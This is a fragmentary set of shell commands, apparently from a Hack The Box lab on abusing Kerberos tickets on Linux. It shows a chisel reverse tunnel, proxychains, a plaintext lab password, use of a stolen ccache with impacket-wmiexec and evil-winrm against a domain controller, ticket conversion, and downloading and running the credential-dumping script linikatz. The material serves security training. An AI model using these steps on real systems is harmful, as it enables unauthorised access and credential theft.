...
```shell-session
Retric@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
...
```shell-session
Retric@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
...
```shell-session
Retric@htb[/htb]$ cat /etc/proxychains.conf
...
```shell-session
Retric@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
Retric@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
Retric@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
Retric@htb[/htb]$ sudo ./chisel server --reverse 
...
```shell-session
Retric@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```
...
```shell-session
Retric@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
...
```shell-session
Retric@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
...
```shell-session
Retric@htb[/htb]$ sudo apt-get install krb5-user -y
...
```shell-session
Retric@htb[/htb]$ cat /etc/krb5.conf
...
```shell-session
Retric@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
...
```shell-session
Retric@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
...
```shell-session
Retric@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
Retric@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
